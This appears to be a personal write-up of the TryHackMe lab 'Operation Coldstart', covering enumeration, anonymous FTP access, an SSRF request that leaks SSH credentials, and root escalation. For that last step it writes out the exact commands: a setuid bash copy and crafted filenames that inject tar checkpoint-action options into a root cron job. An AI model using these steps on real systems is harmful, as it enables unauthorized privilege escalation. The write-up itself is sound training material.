---
dg-publish: true
---
**Challenge URL: [TryHackMe | Operation Coldstart](https://tryhackme.com/room/operationcoldstart)

**System Used: THM Attack Boxx

**Room Task: Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

**Written By: Spooky

**Solution:**

# Enumeration

1) NMAP Scan of Target IP
	1) ![[Pasted image 20260714092024.png]]
2) Browse to Target IP
3) Enumerate with GoBuster
	1) ![[Pasted image 20260714092454.png]]
4) Browse to the `/preview` domain
	1) ![[Pasted image 20260714092528.png]]
	2) We will come back to this
5) Use FTP to try to login on port 21
	1) We are able to login in as anonymous
	2) backup.tar.gz is downloadable
6) Extract tar file
	1) `tar -xzf /path/to/file
	2) We get `README.md`, `app.py`, and `requirements.txt`
	3) README.txt
		1) ![[Pasted image 20260714095837.png]]
	4) app.py
		1) ![[Pasted image 20260714095915.png]]
	5) Requirements
		1) ![[Pasted image 20260714095942.png]]
7) Further down in app.py we see the app route for /admin with the special path of notes. Combine this with our known accepted host from the same file to create a SSFR exploit
	1) `http://10.145.164.102/preview?url=http://kestrel.thm/admin/notes`
	2) ![[Pasted image 20260714102133.png]]
8) Use SSH credentials discovered to login to system and find user.txt
	1) ![[Pasted image 20260714102306.png|592]]
9) Use a tool like LINPeas to find vulnerabilities
	1) Daily Cron job can be shelled
	2) `root cd /opt/backups && tar czf /var/backups/uploads.tgz *`
	3) When root's cron runs `tar czf out.tgz *` in a directory you can write to, the shell expands `*` to whatever filenames exist there. Files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` get passed to tar as actual command-line flags. Tar's `--checkpoint-action=exec=` runs a shell command at each checkpoint, so it executes `shell.sh` as `root`
		1) `cd /opt/backups`
		2) `echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh`
		3) `touch -- '--checkpoint=1'`
		4) `touch -- '--checkpoint-action=exec=sh shell.sh'`
	4) Change directory to /tmp
		1) `/tmp/bash -p` will load the shell
	5) Confirm root and browse to root folder to get flag